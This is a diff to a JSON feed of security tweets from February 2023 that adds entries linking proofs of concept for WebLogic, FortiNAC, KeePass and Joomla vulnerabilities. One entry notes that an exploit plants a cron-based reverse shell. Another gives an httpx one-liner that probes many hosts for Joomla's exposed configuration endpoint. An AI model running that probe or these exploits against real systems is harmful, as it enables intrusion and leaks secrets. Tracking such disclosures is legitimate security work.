@@ -65,6 +65,19 @@
     "expanded_url": [
         "https://github.com/Scarehehe/Weblogic-CVE-2023-21839"
     ],
+    "tweetfavorites": 124,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 50,
+    "tweettext": "CVE-2023-21839 Wheels made by public poc according to the network\nAffected version\n12.2.1.3.0\n12.2.1.4.0\n14.1.1.0.0\nhttps://t.co/auA2sreYpn",
+    "tweettime": "2023-02-22, 03:28:28",
+    "tweeturl": "https://twitter.com/momika233/status/1628235245161160705",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://github.com/Scarehehe/Weblogic-CVE-2023-21839"
+    ],
     "tweetfavorites": 86,
     "tweetquotes": 4,
     "tweetreplies": 2,
@@ -73,6 +86,19 @@
     "tweettime": "2023-02-22, 02:07:08",
     "tweeturl": "https://twitter.com/cyber_advising/status/1628214777586626566",
     "username": "cyber_advising"
+}
+{
+    "expanded_url": [
+        "https://github.com/horizon3ai/CVE-2022-39952"
+    ],
+    "tweetfavorites": 148,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 45,
+    "tweettext": "POC for CVE-2022-39952 affecting Fortinet FortiNAC\n\nThe default configuration of this exploit writes a cron job to create a reverse shell. Be sure to change the payload file to suite your environment.\nhttps://t.co/dhhOCINfoI",
+    "tweettime": "2023-02-21, 15:08:03",
+    "tweeturl": "https://twitter.com/momika233/status/1628048916053917696",
+    "username": "momika233"
 }
 {
     "expanded_url": [
@@ -190,6 +216,16 @@
     "username": "cyber_advising"
 }
 {
+    "tweetfavorites": 438,
+    "tweetquotes": 2,
+    "tweetreplies": 5,
+    "tweetretweets": 132,
+    "tweettext": "CVE-2023-23752\nJoomla webservice endpoint access\nPoC\nhttpx -l ip.txt -path '/api/index.php/v1/config/application?public=true'",
+    "tweettime": "2023-02-17, 06:10:55",
+    "tweeturl": "https://twitter.com/momika233/status/1626464189261942786",
+    "username": "momika233"
+}
+{
     "expanded_url": [
         "https://github.com/j00sean/CVE-2022-44666"
     ],
@@ -281,7 +317,7 @@
     "expanded_url": [
         "https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2023-21715"
     ],
-    "tweetfavorites": 205,
+    "tweetfavorites": 196,
     "tweetquotes": 5,
     "tweetreplies": 3,
     "tweetretweets": 61,
@@ -325,6 +361,19 @@
     "tweettime": "2023-02-11, 19:30:03",
     "tweeturl": "https://twitter.com/0xor0ne/status/1624490971521073159",
     "username": "0xor0ne"
+}
+{
+    "expanded_url": [
+        "https://github.com/alt3kx/CVE-2023-24055_PoC"
+    ],
+    "tweetfavorites": 131,
+    "tweetquotes": 2,
+    "tweetreplies": 1,
+    "tweetretweets": 53,
+    "tweettext": "CVE-2023-24055 PoC (KeePass 2.5x)\nhttps://t.co/CVzndZOj5M",
+    "tweettime": "2023-02-11, 10:28:43",
+    "tweeturl": "https://twitter.com/momika233/status/1624354737461276677",
+    "username": "momika233"
 }
 {
     "expanded_url": [
@@ -532,4 +581,17 @@
     "tweettime": "2023-02-01, 08:11:42",
     "tweeturl": "https://twitter.com/cyb3rops/status/1620696377851367425",
     "username": "cyb3rops"
+}
+{
+    "expanded_url": [
+        "https://github.com/advisories/GHSA-3cw5-7cxw-v5qg"
+    ],
+    "tweetfavorites": 274,
+    "tweetquotes": 1,
+    "tweetreplies": 6,
+    "tweetretweets": 83,
+    "tweettext": "CVE-2023-23924: Critical-Severity RCE Flaw Found in Popular Dompdf Library\nhttps://t.co/EUdDRSJpI0 https://t.co/pa3VLXXRAD",
+    "tweettime": "2023-02-01, 05:32:09",
+    "tweeturl": "https://twitter.com/momika233/status/1620656226349768709",
+    "username": "momika233"
 }
